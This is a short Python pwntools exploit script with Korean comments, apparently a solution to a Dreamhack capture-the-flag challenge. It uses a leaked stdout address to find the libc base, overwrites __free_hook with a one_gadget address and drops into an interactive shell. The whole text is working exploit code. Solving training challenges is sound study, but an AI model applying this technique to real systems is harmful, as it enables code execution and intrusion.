from pwn import *

r = remote("host3.dreamhack.games", 13316)
libc = ELF('/mnt/c/Users/storm/downloads/6b8cd690-a995-4baa-a3a8-e89ec6005659/libc-2.23.so')

r.recvuntil("stdout: ") #문제에서 libc base를 구할 수 있게 stdout 함수 주소를 leak 해줌
stdout = int(r.recvline(),16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
one_gadget = libc_base + 0x4527a

hook = libc_base + libc.symbols['__free_hook']

payload = p64(hook) + p64(one_gadget) #ptr = ptr + 1 로 인해서 free_hook이 one_gadget으로 바뀜

r.sendline(b"16")
r.sendlineafter("Data: ", payload) #이후 main의 free가 실행될 때 one_gadget이 실행됨.

r.interactive()